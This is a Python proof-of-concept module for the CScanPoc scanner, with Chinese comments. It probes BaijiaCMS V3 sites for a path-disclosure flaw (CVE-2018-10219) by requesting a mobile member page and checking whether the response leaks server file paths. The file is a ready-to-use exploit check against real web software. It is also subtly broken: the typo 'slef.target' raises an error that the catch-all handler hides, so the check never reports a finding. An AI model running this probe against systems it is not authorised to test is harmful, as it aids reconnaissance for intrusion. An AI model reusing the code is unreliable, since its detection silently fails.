# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'BaijiaCMS_0006'  # 平台漏洞编号
    name = 'BaijiaCMS路径泄露'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2018-06-19'  # 漏洞公布时间
    desc = '''
    baijiacms 3版本中存在安全漏洞。攻击者可通过发送index.php?mod=mobile&name=member&do=index请求利用该漏洞获取物理路径。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-11709'
    cnvd_id = 'CNVD-2018-11709'  # cnvd漏洞编号
    cve_id = 'CVE-2018-10219'  # cve编号
    product = 'BaijiaCMS'  # 漏洞组件名称
    product_version = 'V3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '91ab8ca9-ec35-461d-be99-8240dc0d7b48'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-07-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/index.php?mod=mobile&name=member&do=index"

            vul_url = slef.target + payload
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            response = requests.get(vul_url)
            self.output.info("正在构造路径泄露测试语句")
            if response.status_code == 200 and '/system/member/mobile.php' in response.text and 'ModuleSite' in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name,url=vul_url))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
